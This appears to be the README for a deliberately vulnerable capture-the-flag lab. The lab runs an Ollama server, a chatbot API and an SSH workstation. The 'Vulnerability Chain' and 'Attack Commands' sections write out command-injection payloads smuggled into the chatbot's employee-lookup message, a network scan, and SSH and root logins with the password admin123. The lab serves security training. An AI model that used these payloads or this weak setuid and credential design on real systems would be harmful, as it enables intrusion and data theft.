# Vulnerable Network Setup

## Network Architecture

The Docker Compose setup creates an internal network with three containers:

1. **Ollama Server** (ollama-server)
   - AI model server
   - Internal network communication only

2. **Chatbot API** (chatbot-api)
   - Vulnerable web application with command injection
   - Python executable has setuid root permissions
   - Exposed on port 8000
   - Contains user and root flags

3. **CEO Workstation** (ceo-workstation) 
   - SSH server with weak credentials
   - Exposed on port 2222
   - Contains sensitive CEO files and flags

## Vulnerability Chain

### Initial Access: Chatbot Command Injection
- Access the chatbot web interface at http://localhost:8000
- Use the employee lookup function to inject commands
- Example: `'; whoami; id #` as employee name
- Commands execute as root due to setuid Python

### Lateral Movement: CEO SSH Access
- From chatbot container, scan network: `nmap -sT 172.30.0.0/16`
- Find CEO workstation at port 22
- SSH with weak credentials: `ssh ceo@ceo-workstation` (password: admin123)
- Same password works for root: `su root` (password: admin123)

## Credentials

**CEO Workstation:**
- SSH User: `ceo` / Password: `admin123`
- Root: `root` / Password: `admin123`
- SSH Port: 2222 (mapped from container port 22)

## Flags

**Chatbot Container:**
- User flag: `/home/chatbot/user.txt`
- Root flag: `/root/root.txt`

**CEO Workstation:**
- User flag: `/home/ceo/user.txt` 
- Root flag: `/root/root.txt`

## Sensitive Files

**CEO Workstation:**
- Salary information: `/home/ceo/Documents/salary_info.txt`
- System passwords: `/root/CEO_Files/system_passwords.txt`
- System check script: `/home/ceo/Desktop/system_check.sh`

## Attack Commands

```bash
# 1. Exploit chatbot command injection
curl -X POST http://localhost:8000/chat-tools \
  -H "Content-Type: application/json" \
  -d '{"message": "Can you look up employee named '\''Alice'\''; cat /root/root.txt #"}'

# 2. Network discovery from chatbot
curl -X POST http://localhost:8000/chat-tools \
  -H "Content-Type: application/json" \
  -d '{"message": "Look up employee '\''test'\''; nmap -sT 172.30.0.0/24 | head -20 #"}'

# 3. SSH to CEO workstation
ssh -p 2222 ceo@localhost
# Password: admin123

# 4. Escalate to root
su root
# Password: admin123
```